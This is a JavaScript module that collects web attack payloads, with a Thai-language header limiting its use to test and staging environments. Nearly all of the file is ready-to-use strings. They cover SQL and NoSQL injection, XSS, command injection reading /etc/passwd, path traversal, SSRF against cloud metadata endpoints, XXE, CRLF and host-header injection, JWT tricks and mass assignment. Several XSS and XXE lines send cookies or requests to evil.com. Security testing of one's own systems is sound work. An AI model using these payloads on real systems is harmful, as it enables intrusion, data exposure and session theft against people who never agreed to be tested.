/**
 * Security Attack Payloads
 * Enterprise-level penetration testing payloads
 * 
 * ⚠️ WARNING: ใช้เฉพาะใน test/staging environment เท่านั้น
 * ห้ามใช้กับ production systems โดยไม่ได้รับอนุญาต
 */

// ============================================
// SQL Injection Payloads
// ============================================
export const sqlInjectionPayloads = {
    // Classic SQL injection
    classic: [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' OR '1'='1",
        "1 OR 1=1",
        "1' OR 1=1--",
        "admin'--",
        "admin' #",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
    ],

    // Union-based injection
    union: [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' UNION SELECT username, password FROM users--",
        "1' UNION SELECT 1,2,3--",
        "1' UNION ALL SELECT NULL,NULL,@@version--",
    ],

    // Blind SQL injection (Boolean-based)
    blind: [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1' AND SUBSTRING(@@version,1,1)='5'--",
    ],

    // Time-based blind injection
    timeBased: [
        "'; WAITFOR DELAY '0:0:5'--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5);--",
        "1' AND SLEEP(5)--",
        "1' AND BENCHMARK(10000000,SHA1('test'))--",
    ],

    // Error-based injection  
    errorBased: [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
};

// ============================================
// XSS (Cross-Site Scripting) Payloads
// ============================================
export const xssPayloads = {
    // Basic XSS
    basic: [
        '<script>alert("XSS")</script>',
        '<script>alert(document.cookie)</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
    ],

    // Event handlers
    eventHandlers: [
        '<img src="x" onerror="alert(1)">',
        '<div onmouseover="alert(1)">hover me</div>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror="alert(1)">',
        '<details open ontoggle=alert(1)>',
    ],

    // Encoding bypass
    encodingBypass: [
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<svg/onload=alert(1)>',
        '<script\\x20>alert(1)</script>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
    ],

    // DOM-based XSS
    domBased: [
        'javascript:alert(1)',
        'javascript:alert(document.domain)',
        '#<script>alert("XSS")</script>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
    ],

    // Filter bypass
    filterBypass: [
        '<SCRIPT>alert(1)</SCRIPT>',
        '<ScRiPt>alert(1)</sCrIpT>',
        '<script>alert(1)//</script>',
        '<script>alert`1`</script>',
        '<script>confirm(1)</script>',
        '<script>prompt(1)</script>',
    ],

    // Data exfiltration
    dataExfil: [
        '<script>new Image().src="http://evil.com/steal?c="+document.cookie</script>',
        '<script>fetch("http://evil.com/"+document.cookie)</script>',
        '<img src="http://evil.com/steal?c="+document.cookie>',
    ],
};

// ============================================
// Command Injection Payloads
// ============================================
export const commandInjectionPayloads = {
    // Basic command injection
    basic: [
        '; ls -la',
        '| ls -la',
        '|| ls -la',
        '&& ls -la',
        '`ls -la`',
        '$(ls -la)',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
    ],

    // Windows commands
    windows: [
        '& dir',
        '| dir',
        '&& dir',
        '; dir',
        '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '& net user',
    ],

    // Blind command injection
    blind: [
        '; sleep 5',
        '| sleep 5',
        '&& sleep 5',
        '; ping -c 5 127.0.0.1',
        '$(sleep 5)',
        '`sleep 5`',
    ],
};

// ============================================
// NoSQL Injection Payloads
// ============================================
export const noSqlInjectionPayloads = {
    // MongoDB injection
    mongodb: [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$regex": ".*"}',
        '{"$where": "sleep(5000)"}',
        '{"$or": [{"x": 1}, {"y": 1}]}',
    ],

    // Object manipulation
    objectManip: [
        { $gt: '' },
        { $ne: null },
        { $regex: '.*' },
        { $where: 'this.password.length > 0' },
    ],
};

// ============================================
// Path Traversal Payloads
// ============================================
export const pathTraversalPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '/etc/passwd',
    '....//....//etc/passwd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
];

// ============================================
// Authentication Bypass Payloads
// ============================================
export const authBypassPayloads = {
    // Common passwords
    commonPasswords: [
        'password',
        '123456',
        'admin',
        'password123',
        'qwerty',
        'letmein',
        'welcome',
        'Password1',
        'admin123',
        '12345678',
    ],

    // JWT manipulation
    jwtAttacks: {
        noneAlgorithm: {
            header: { alg: 'none', typ: 'JWT' },
        },
        emptySignature: '',
        algorithmConfusion: { alg: 'HS256' }, // When server expects RS256
    },

    // Session fixation
    sessionFixation: [
        'JSESSIONID=attacker_controlled_session',
        'PHPSESSID=attacker_controlled_session',
    ],
};

// ============================================
// Header Injection Payloads
// ============================================
export const headerInjectionPayloads = {
    // Host header injection
    hostHeader: [
        'evil.com',
        'evil.com:443',
        'localhost',
        '127.0.0.1',
        '[::1]',
    ],

    // CRLF injection
    crlf: [
        '%0d%0aSet-Cookie: evil=value',
        '%0d%0aX-Injected-Header: evil',
        '\r\nX-Injected: true',
        '%0d%0a%0d%0a<html>',
    ],

    // Cache poisoning
    cachePoison: [
        'X-Forwarded-Host: evil.com',
        'X-Forwarded-For: 127.0.0.1',
        'X-Original-URL: /admin',
        'X-Rewrite-URL: /admin',
    ],
};

// ============================================
// SSRF (Server-Side Request Forgery) Payloads
// ============================================
export const ssrfPayloads = [
    'http://localhost/',
    'http://127.0.0.1/',
    'http://[::1]/',
    'http://0.0.0.0/',
    'http://169.254.169.254/', // AWS metadata
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/', // GCP metadata
    'file:///etc/passwd',
    'dict://localhost:11211/',
    'gopher://localhost:6379/',
];

// ============================================
// XXE (XML External Entity) Payloads
// ============================================
export const xxePayloads = [
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
    `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><root>&xxe;</root>`,
    `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "expect://id">]><data>&xxe;</data>`,
];

// ============================================
// Mass Assignment Payloads
// ============================================
export const massAssignmentPayloads = {
    roleEscalation: {
        role: 'superadmin',
        isAdmin: true,
        admin: true,
        permissions: ['all'],
    },
    sensitiveFields: {
        password: 'hacked123',
        passwordHash: 'fake_hash',
        email: 'attacker@evil.com',
        verified: true,
        active: true,
    },
    financialData: {
        balance: 999999,
        credit: 999999,
        salary: 999999,
    },
};

// ============================================
// Export all payloads
// ============================================
export const allPayloads = {
    sqlInjection: sqlInjectionPayloads,
    xss: xssPayloads,
    commandInjection: commandInjectionPayloads,
    noSqlInjection: noSqlInjectionPayloads,
    pathTraversal: pathTraversalPayloads,
    authBypass: authBypassPayloads,
    headerInjection: headerInjectionPayloads,
    ssrf: ssrfPayloads,
    xxe: xxePayloads,
    massAssignment: massAssignmentPayloads,
};

export default allPayloads;
